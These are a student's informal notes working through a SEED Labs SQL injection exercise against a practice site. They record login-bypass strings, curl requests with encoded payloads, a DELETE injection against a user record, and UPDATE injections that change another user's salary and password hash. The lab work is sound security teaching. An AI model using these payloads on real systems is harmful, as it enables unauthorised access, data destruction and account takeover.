3.1 - Done
	got a better pic
3.2.1 - Done
	Not bad, what I typed in was:
	Username: admin';#
	Password:dotdotdot;
	It worked
3.2.2 - Done
	looks very wrong, but still readable
	had to use a different url than what was given in pdf
	used the username above as well as the same password
	try this:
	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%3B%23&Password='
	other script:
		its technically all there, just a pain to read
3.2.3 - In Process
	Very hard
	tyring to understand slide 3
	if the WHERE concludes the sql part, how am I supposed to append a new statement
	not possible, but******
	check slide 30 in SQL slides (the bottom of the slide)

3.3.1 - Finished
	try this:
	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin';DELETE FROM credential WHERE name='Boby';#&Password'
	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%3BDELETE%20FROM%20credential%20WHERE%20name=%27Boby%27%3B%23&Password='
	curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%20%OR%201=1%3B%20DELETE%20FROM%20credential%20WHERE%20name=%27Boby%27%3B%23&Password='

	just don't curl it bruh, just go to the edit profile and submit it manually

3.3.2 - Done
	hard, but going
	need to get to the WHERE statement
	tried:
		idiot',salary=1 WHERE name='Boby';";#
		idiot', salary=1 WHERE name='Boby'";# 
		idiot',salary=1, WHERE name='Boby'";--
		idiot',salary='1' WHERE name='Boby';
	worked:
		idiot',salary='1' WHERE name='Boby';#
	other script:
		we successfully changed Boby's salary and nickname (sorry, kinda harsh!)
3.3.3 - In Progress
	Password in string: ezPa$$
	Password through hash: c20e4b339112c7b6624a7438241869e900d4a4d0
	worked:
		',Password='c20e4b339112c7b6624a7438241869e900d4a4d0' WHERE name='Boby';#
		I'm not typing in the password field because its all dots, cannot confirm that it is what I set it to.
	other script:
		should just be 6 dots, which are:
		ezPa$$
		
		we're in!
